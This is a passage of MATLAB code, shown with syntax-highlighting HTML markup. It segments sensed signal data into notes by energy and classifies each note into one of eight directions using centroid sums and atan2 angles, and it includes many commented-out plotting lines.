    <span class="token keyword">for</span> jj <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>time_thre<span class="token punctuation">)</span><span class="token punctuation">,</span>
        curr_thre <span class="token operator">=</span> <span class="token function">time_thre</span><span class="token punctuation">(</span>jj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        curr_valu <span class="token operator">=</span> <span class="token function">moti_valu</span><span class="token punctuation">(</span>jj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ii <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> ii <span class="token operator">&lt;=</span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">while</span> ii <span class="token operator">&lt;=</span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">moti_inde</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">~=</span> curr_valu<span class="token punctuation">,</span>
                ii <span class="token operator">=</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            <span class="token keyword">if</span> ii <span class="token operator">></span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            kk <span class="token operator">=</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> kk <span class="token operator">&lt;=</span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">moti_inde</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span> <span class="token operator">==</span> curr_valu<span class="token punctuation">,</span>
                kk <span class="token operator">=</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            <span class="token keyword">if</span> kk <span class="token operator">-</span> ii <span class="token operator">&lt;</span> curr_thre <span class="token operator">*</span> samp_rate<span class="token punctuation">,</span>
                <span class="token function">moti_inde</span><span class="token punctuation">(</span>ii<span class="token operator">:</span>kk<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">~</span>curr_valu<span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            ii <span class="token operator">=</span> kk<span class="token punctuation">;</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>
    moti_indx <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span><span class="token punctuation">;</span>
    note_inte <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span>note_inte <span class="token operator">*</span> samp_rate<span class="token punctuation">)</span><span class="token punctuation">;</span>
    note_indx <span class="token operator">=</span> <span class="token function">moti_indx</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">%note_indx = indx_list(ll);</span>
    note_end <span class="token operator">=</span> <span class="token function">moti_indx</span><span class="token punctuation">(</span><span class="token keyword">end</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    note_segm <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span>n_note<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">%% Segmentation...</span>
    segm_lowb <span class="token operator">=</span> <span class="token number">0.8</span><span class="token punctuation">;</span>
    segm_higb <span class="token operator">=</span> <span class="token number">1.2</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> ii <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n_note<span class="token punctuation">,</span>
        <span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> note_indx<span class="token punctuation">;</span>
        <span class="token keyword">if</span> ii <span class="token operator">&lt;</span> n_note<span class="token punctuation">,</span>
            curr_ener <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">prof_ener</span><span class="token punctuation">(</span>note_indx<span class="token operator">:</span><span class="token function">min</span><span class="token punctuation">(</span>note_indx<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>note_inte<span class="token number">-1</span><span class="token punctuation">,</span><span class="token function">size</span><span class="token punctuation">(</span>prof_ener<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">,</span> segm_poin<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">curr_ener</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_lowb<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_higb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> note_indx<span class="token operator">+</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_lowb<span class="token punctuation">)</span><span class="token operator">+</span>segm_poin<span class="token number">-1</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%             plot(time_bins(note_indx:min(note_indx+2*note_inte-1,size(prof_ener,1))), curr_ener);</span>
<span class="token comment" spellcheck="true">%             hold on;</span>
<span class="token comment" spellcheck="true">%             plot(time_bins(note_indx-1+floor(note_inte*segm_lowb)+segm_poin), curr_ener(floor(note_inte*segm_lowb)+segm_poin), </span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%             hold off;</span>
            note_indx <span class="token operator">=</span> note_indx<span class="token operator">+</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_lowb<span class="token punctuation">)</span><span class="token operator">+</span>segm_poin<span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            curr_ener <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">prof_ener</span><span class="token punctuation">(</span>note_indx<span class="token operator">:</span>note_end<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> note_end<span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%             plot(time_bins(note_indx:note_end), curr_ener);</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>

    <span class="token comment" spellcheck="true">%% Recognition..</span>
    <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>prof_cent<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span><span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span> samp_rate<span class="token operator">/</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         powe_cent(:,kk) = smooth(powe_cent(:,kk), samp_rate/4+1, </span><span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">end</span>
    <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">~</span>moti_inde<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    prof_cent_tota <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>prof_cent<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>
    prof_cent_tota <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span>prof_cent_tota<span class="token punctuation">,</span> samp_rate<span class="token operator">/</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%     powe_cent(~moti_inde,:) = 0;</span>
<span class="token comment" spellcheck="true">%     powe_cent_tota = sum(abs(powe_cent),2)/2;</span>
<span class="token comment" spellcheck="true">%     powe_cent_tota = smooth(powe_cent_tota, samp_rate/8+1, </span><span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    note_list <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n_note<span class="token punctuation">)</span><span class="token punctuation">;</span>
    tx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.6</span><span class="token punctuation">,</span><span class="token number">1.6</span><span class="token punctuation">]</span><span class="token operator">.'</span><span class="token punctuation">;</span>
    rx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1.6</span><span class="token punctuation">;</span><span class="token number">1.6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.'</span><span class="token punctuation">;</span>
    init_loc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.8</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">]</span><span class="token operator">.'</span><span class="token punctuation">;</span>
    tant_valu <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n_note<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dire_valu <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>n_note<span class="token punctuation">)</span><span class="token punctuation">;</span>
    peak_dist <span class="token operator">=</span> <span class="token number">0.1</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> ii <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n_note<span class="token punctuation">,</span>
        curr_cent <span class="token operator">=</span> <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        curr_cent_tota <span class="token operator">=</span> <span class="token function">prof_cent_tota</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         curr_powe_cent = powe_cent(note_segm(ii,1):note_segm(ii,2),:);</span>
<span class="token comment" spellcheck="true">%         curr_powe_cent_tota = powe_cent_tota(note_segm(ii,1):note_segm(ii,2),:);</span>
        curr_cent <span class="token operator">=</span> <span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token function">moti_inde</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        curr_cent_tota <span class="token operator">=</span> <span class="token function">curr_cent_tota</span><span class="token punctuation">(</span><span class="token function">moti_inde</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        midd_poin <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>curr_cent_tota<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        firs_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        seco_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token function">firs_half</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">seco_half</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        curr_cent <span class="token operator">=</span> curr_cent <span class="token operator">-</span> <span class="token function">repmat</span><span class="token punctuation">(</span><span class="token function">mean</span><span class="token punctuation">(</span>curr_cent<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">size</span><span class="token punctuation">(</span>curr_cent<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        firs_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        seco_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         if (mark_list(ii) >= 1 &amp;&amp; mark_list(ii) &lt;= 2) || (mark_list(ii) == 8),</span>
<span class="token comment" spellcheck="true">%             firs_half(2) = firs_half(2);</span>
<span class="token comment" spellcheck="true">%             seco_half(2) = seco_half(2);</span>
<span class="token comment" spellcheck="true">%         elseif (mark_list(ii) >= 4 &amp;&amp; mark_list(ii) &lt;= 6),</span>
<span class="token comment" spellcheck="true">%             firs_half(1) = firs_half(1);</span>
<span class="token comment" spellcheck="true">%             seco_half(1) = seco_half(1);</span>
<span class="token comment" spellcheck="true">%         end</span>
        <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atan2</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">firs_half</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">seco_half</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">firs_half</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">seco_half</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">pi</span> <span class="token operator">*</span> <span class="token number">180</span><span class="token punctuation">;</span>        
        <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> firs_half <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">,</span>
            <span class="token keyword">if</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">elseif</span> <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">,</span>
            <span class="token keyword">if</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">else</span>
            <span class="token keyword">if</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
            <span class="token keyword">elseif</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
            <span class="token keyword">elseif</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">mod</span><span class="token punctuation">(</span><span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         if tant_valu(ii) > 45,</span>
<span class="token comment" spellcheck="true">%             if dire_valu(1,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 8;</span>
<span class="token comment" spellcheck="true">%             else</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 4;</span>
<span class="token comment" spellcheck="true">%             end</span>
<span class="token comment" spellcheck="true">%         else</span>
<span class="token comment" spellcheck="true">%             if dire_valu(2,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 6;</span>
<span class="token comment" spellcheck="true">%             else</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 2;</span>
<span class="token comment" spellcheck="true">%             end</span>
<span class="token comment" spellcheck="true">%         end</span>

<span class="token comment" spellcheck="true">%             if dire_valu(1,ii) == 1 &amp;&amp; dire_valu(2,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 7;</span>
<span class="token comment" spellcheck="true">%             elseif dire_valu(1,ii) == 1 &amp;&amp; dire_valu(2,ii) == 0,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 1;</span>
<span class="token comment" spellcheck="true">%             elseif dire_valu(1,ii) == 0 &amp;&amp; dire_valu(2,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 5;</span>
<span class="token comment" spellcheck="true">%             else</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 3;</span>
<span class="token comment" spellcheck="true">%             end</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token string">'index:%d... tant:%f... dire: %d,%d... mark: %d... pred: %d\n'</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mark_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">%         [peas,locs,wids,pros] = findpeaks(curr_cent_tota, </span><span class="token string">'SortStr'</span><span class="token punctuation">,</span> <span class="token string">'descend'</span><span class="token punctuation">,</span> <span class="token string">'MinPeakDistance'</span><span class="token punctuation">,</span> peak_dist <span class="token operator">*</span> samp_rate<span class="token punctuation">,</span> <span class="token string">'WidthReference'</span><span class="token punctuation">,</span> <span class="token string">'halfheight'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         if length(locs) == 1,</span>
<span class="token comment" spellcheck="true">%             if curr_cent_tota(1) > curr_cent_tota(end),</span>
<span class="token comment" spellcheck="true">%                 locs = [locs; 1];</span>
<span class="token comment" spellcheck="true">%                 peas = [peas; curr_cent_tota(1)];</span>
<span class="token comment" spellcheck="true">%             else</span>
<span class="token comment" spellcheck="true">%                 locs = [locs; length(curr_cent_tota)];</span>
<span class="token comment" spellcheck="true">%                 peas = [peas; curr_cent_tota(end)];</span>
<span class="token comment" spellcheck="true">%             end</span>
<span class="token comment" spellcheck="true">%         elseif length(locs) == 0,</span>
<span class="token comment" spellcheck="true">%             locs = [1; length(curr_cent_tota)];</span>
<span class="token comment" spellcheck="true">%             peas = [curr_cent_tota(1); curr_cent_tota(end)];</span>
<span class="token comment" spellcheck="true">%         end</span>
<span class="token comment" spellcheck="true">%        </span>
<span class="token comment" spellcheck="true">%         subplot(4,1,1);</span>
<span class="token comment" spellcheck="true">%         mesh(time_bins(note_segm(ii,1):note_segm(ii,2)), freq_bins, norm_freq_time_prof(:,note_segm(ii,1):note_segm(ii,2),1));view(0,90)</span>
<span class="token comment" spellcheck="true">%         ylim([-0.04,0.04]);</span>
<span class="token comment" spellcheck="true">%         subplot(4,1,3);</span>
<span class="token comment" spellcheck="true">%         mesh(time_bins(note_segm(ii,1):note_segm(ii,2)), freq_bins, norm_freq_time_prof(:,note_segm(ii,1):note_segm(ii,2),2));view(0,90)</span>
<span class="token comment" spellcheck="true">%         ylim([-0.04,0.04]);</span>
<span class="token comment" spellcheck="true">%         subplot(4,1,2);</span>
<span class="token comment" spellcheck="true">%         plot(time_bins(note_segm(ii,1):note_segm(ii,2)),curr_cent(:,1)); hold on; plot(time_bins(locs(1:2)+note_segm(ii,1)-1), curr_cent(locs(1:2),1), </span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hold off<span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         subplot(4,1,4);</span>
<span class="token comment" spellcheck="true">%         plot(time_bins(note_segm(ii,1):note_segm(ii,2)),curr_cent(:,2)); hold on; plot(time_bins(locs(1:2)+note_segm(ii,1)-1), curr_cent(locs(1:2),2), </span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hold off<span class="token punctuation">;</span>
    <span class="token keyword">end</span>
    all_tant <span class="token operator">=</span> <span class="token punctuation">[</span>all_tant<span class="token punctuation">,</span> tant_valu<span class="token punctuation">]</span><span class="token punctuation">;</span>
